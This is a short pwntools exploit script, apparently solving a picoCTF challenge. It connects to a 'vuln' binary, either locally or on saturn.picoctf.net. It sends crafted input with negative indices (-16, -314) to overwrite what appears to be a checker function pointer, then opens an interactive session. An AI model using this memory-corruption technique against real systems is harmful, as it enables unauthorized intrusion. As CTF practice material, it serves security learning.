# fun = 0x0804c080
# check = 0x0804c040
# easy_checker = 0x80492fc
# hard_checker = 0x8049436

from pwn import * 
from struct import pack
exe = ELF("./vuln")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 54783)

    return r

def main():
	r = conn()
	# input()
	r. sendlineafter(b'>> ', b'z'*10 + b'u')
	r.sendlineafter(b'than 10.\n', b'-16')
	r.sendline(b'-314')

	# pause()
	r.interactive()
if __name__ == "__main__":
	main()